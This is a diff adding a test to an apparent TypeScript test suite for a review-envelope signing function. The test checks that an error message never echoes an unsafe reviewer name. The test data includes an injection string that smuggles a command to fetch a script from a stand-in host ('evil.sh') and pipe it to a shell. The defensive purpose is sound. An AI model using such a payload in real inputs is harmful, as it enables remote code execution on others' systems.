@@ -772,6 +772,27 @@ describe('signAndWriteV6Envelope — leaves under a stale patch-id (AISDLC-734)'
     expect(message).toContain('never relabeled');
   });
 
+  it('never prints an unsafe reviewer name or task id in the Fix text', () => {
+    const emittedUnder = 'd'.repeat(40);
+    const evil = 'x; curl evil.sh | sh #';
+    appendLeafForPatchId(makeLeaf({ leafIndex: 0, reviewerName: evil }), emittedUnder, tmpRoot);
+    appendLeafForPatchId(makeLeaf({ leafIndex: 1 }), emittedUnder, tmpRoot);
+    let message = '';
+    try {
+      signAndWriteV6Envelope({
+        repoRoot: tmpRoot,
+        headSha: FAKE_HEAD_SHA,
+        taskId: 'AISDLC-383.3',
+        privateKeyPem,
+        patchId: 'e'.repeat(40),
+      });
+    } catch (err) {
+      message = (err as Error).message;
+    }
+    expect(message).not.toContain('curl');
+    expect(message).toContain('seen: code-reviewer)');
+  });
+
   it('keeps the plain message when no leaves exist for the task anywhere', () => {
     appendLeafForPatchId(makeLeaf({ taskId: 'AISDLC-999' }), 'd'.repeat(40), tmpRoot);
     expect(() =>
